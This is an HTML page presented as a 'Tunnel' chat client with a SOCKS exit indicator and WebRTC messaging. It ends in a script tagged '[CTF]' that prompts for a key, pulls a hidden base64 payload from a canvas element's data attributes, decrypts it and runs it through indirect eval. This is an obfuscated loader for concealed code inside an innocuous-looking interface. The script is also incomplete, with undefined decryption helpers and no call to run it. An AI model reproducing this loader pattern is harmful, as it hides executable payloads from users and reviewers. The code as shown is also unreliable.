<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">
    <title>Tunnel · Client</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap');

        :root {
            --bg: #f8f9fa;
            --surface: #ffffff;
            --border: #e2e5e9;
            --border-mid: #c8cdd4;
            --text: #1a1d23;
            --muted: #8b919e;
            --accent: #2563eb;
            --accent-bg: #eff4ff;
            --inbound: #16a34a;
            --inbound-bg: #f0fdf4;
            --warn: #d97706;
            --warn-bg: #fffbeb;
            --err: #dc2626;
            --err-bg: #fef2f2;
            --radius: 6px;
            --font-ui: 'Inter', system-ui, sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            height: 100%;
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: var(--font-ui);
            font-size: 14px;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 14px 24px;
            background: var(--surface);
            border-bottom: 1px solid var(--border);
            flex-shrink: 0;
        }

        header h1 {
            font-size: 15px;
            font-weight: 600;
            letter-spacing: -0.01em;
        }

        .badge {
            font-size: 11px;
            font-weight: 500;
            color: var(--muted);
            background: var(--bg);
            border: 1px solid var(--border);
            padding: 2px 8px;
            border-radius: 20px;
        }

        .badge.peer {
            background: var(--inbound-bg);
            border-color: var(--inbound);
            color: var(--inbound);
        }

        header .spacer {
            flex: 1;
        }

        #header_status {
            font-size: 12px;
            color: var(--muted);
            font-family: var(--font-mono);
        }

        /* ── SOCKS status pill in header ── */
        #socks_status {
            font-size: 11px;
            font-family: var(--font-mono);
            color: var(--muted);
            display: flex;
            align-items: center;
            gap: 5px;
        }

        #socks_pip {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: var(--muted);
            flex-shrink: 0;
            transition: background .3s, box-shadow .3s;
        }

        #socks_pip.on {
            background: var(--inbound);
            box-shadow: 0 0 6px var(--inbound);
        }

        #socks_pip.err {
            background: var(--err);
            box-shadow: 0 0 6px var(--err);
        }

        #broker_strip {
            display: none;
            padding: 8px 24px;
            background: var(--warn-bg);
            border-bottom: 1px solid #fde68a;
            font-size: 12px;
            color: var(--warn);
            font-family: var(--font-mono);
            flex-shrink: 0;
        }

        #broker_strip.active {
            display: block;
        }

        #message_log {
            flex: 1;
            overflow-y: auto;
            padding: 16px 24px;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        #message_log::-webkit-scrollbar {
            width: 6px;
        }

        #message_log::-webkit-scrollbar-thumb {
            background: var(--border-mid);
            border-radius: 3px;
        }

        .msg {
            display: flex;
            align-items: baseline;
            gap: 10px;
            padding: 8px 12px;
            border-radius: var(--radius);
            animation: fadeIn .15s ease;
            line-height: 1.5;
        }

        .msg:hover {
            filter: brightness(.97);
        }

        .msg:hover .copy-btn {
            opacity: 1;
        }

        .msg.inbound {
            background: var(--inbound-bg);
        }

        .msg.outbound {
            background: var(--accent-bg);
        }

        .msg.system {
            background: var(--warn-bg);
        }

        .msg.error {
            background: var(--err-bg);
        }

        .msg .ts {
            font-size: 11px;
            font-family: var(--font-mono);
            color: var(--muted);
            flex-shrink: 0;
            user-select: none;
        }

        .msg .who {
            font-size: 11px;
            font-weight: 600;
            flex-shrink: 0;
            user-select: none;
            min-width: 40px;
        }

        .msg.inbound .who {
            color: var(--inbound);
        }

        .msg.outbound .who {
            color: var(--accent);
        }

        .msg.system .who {
            color: var(--warn);
        }

        .msg.error .who {
            color: var(--err);
        }

        .msg .body {
            flex: 1;
            font-family: var(--font-mono);
            font-size: 13px;
            color: var(--text);
            word-break: break-all;
            white-space: pre-wrap;
        }

        .msg.error .body {
            color: var(--err);
        }

        .msg.system .body {
            color: var(--warn);
        }

        .copy-btn {
            opacity: 0;
            flex-shrink: 0;
            background: none;
            border: 1px solid var(--border-mid);
            border-radius: 4px;
            padding: 2px 7px;
            font-size: 11px;
            font-family: var(--font-ui);
            font-weight: 500;
            color: var(--muted);
            cursor: pointer;
            transition: border-color .15s, color .15s, opacity .15s;
            user-select: none;
        }

        .copy-btn:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        .copy-btn.copied {
            color: var(--inbound);
            border-color: var(--inbound);
            opacity: 1;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(3px);
            }

            to {
                opacity: 1;
                transform: none;
            }
        }

        .compose-bar {
            display: flex;
            gap: 10px;
            padding: 16px 24px;
            background: var(--surface);
            border-top: 1px solid var(--border);
            flex-shrink: 0;
            align-items: center;
        }

        #client_input {
            flex: 1;
            font-family: var(--font-mono);
            font-size: 13px;
            color: var(--text);
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 10px 14px;
            outline: none;
            transition: border-color .15s, box-shadow .15s;
        }

        #client_input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, .1);
        }

        #client_input::placeholder {
            color: var(--muted);
        }

        #client_input:disabled {
            opacity: .5;
            cursor: not-allowed;
        }

        #btn_send {
            background: var(--accent);
            border: none;
            border-radius: var(--radius);
            color: #fff;
            font-family: var(--font-ui);
            font-weight: 600;
            font-size: 13px;
            padding: 10px 20px;
            cursor: pointer;
            flex-shrink: 0;
            transition: background .15s, box-shadow .15s;
        }

        #btn_send:hover {
            background: #1d4ed8;
            box-shadow: 0 2px 8px rgba(37, 99, 235, .3);
        }

        #btn_send:active {
            background: #1e40af;
        }

        #btn_send:disabled {
            opacity: .4;
            cursor: not-allowed;
        }

        #btn_file {
            background: none;
            border: 1px solid var(--border-mid);
            border-radius: var(--radius);
            color: var(--muted);
            font-size: 18px;
            line-height: 1;
            padding: 8px 12px;
            cursor: pointer;
            flex-shrink: 0;
            transition: border-color .15s, color .15s;
        }

        #btn_file:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        #btn_file:disabled {
            opacity: .3;
            cursor: not-allowed;
        }
    </style>
</head>

<body>

    <header>
        <h1>Tunnel</h1>
        <span class="badge" id="transport_badge">ably</span>
        <div class="spacer"></div>
        <!-- ── SOCKS exit status ── -->
        <div id="socks_status">
            <span id="socks_pip"></span>
            <span id="socks_label">socks exit: disconnected</span>
        </div>
        <span id="header_status">connecting…</span>
    </header>

    <div id="broker_strip">⧗ <span id="broker_status_text"></span></div>

    <div id="message_log"></div>

    <div class="compose-bar">
        <input id="client_input" type="text" placeholder="Waiting for admin to initiate WebRTC…" autocomplete="off" disabled="">
        <button id="btn_file" title="Send file" disabled="">📎</button>
        <input id="file_input" type="file" style="display:none">
        <button id="btn_send" disabled="">Send</button>
    </div>

<script>(async function(){
function _ctfError(msg){ document.body.style.cssText="background:#000;color:#f00;font:1rem monospace;padding:2rem;white-space:pre"; document.body.textContent="[CTF] "+msg; }

/* ── KEY PROVIDER ── */
const key = prompt("Enter the key:");
if (!key) { _ctfError("No key supplied."); return; }

/* ── ENCODE/DECODE ── */
function fetchPayloads(){
  const c=document.getElementById("pd-canvas");
  if(!c) return [];
  return [c.dataset.p+"|"+c.dataset.len];
}
function decode(s){
  const [b64,lenStr]=s.split("|");
  const len=parseInt(lenStr);
  const raw=atob(b64);
  const bytes=new Uint8Array(len);
  for(let i=0;i<len;i++) bytes[i]=raw.charCodeAt(i*4);
  return new TextDecoder().decode(bytes);
}

/* ── DECRYPT ── */
async function decrypt(hex, key) {

  const k=await dk(key);
  const bytes=new Uint8Array(hex.match(/.{2}/g).map(h=>parseInt(h,16)));
  const out=new Uint8Array(bytes.length);
  const dv=new DataView(bytes.buffer),ov=new DataView(out.buffer);
  for(let i=0;i<bytes.length;i+=8){const[a,b]=db(dv.getUint32(i),dv.getUint32(i+4),k);ov.setUint32(i,a);ov.setUint32(i+4,b);}
  const len=new DataView(out.buffer).getUint32(0);
  return new TextDecoder().decode(out.slice(4,4+len));
}

/* ── PIPELINE ── */
async function run(){
  for(const raw of fetchPayloads()){
    const decoded=decode(raw);
    const src=await decrypt(decoded,key);
    (0,eval)(src);
  }
}
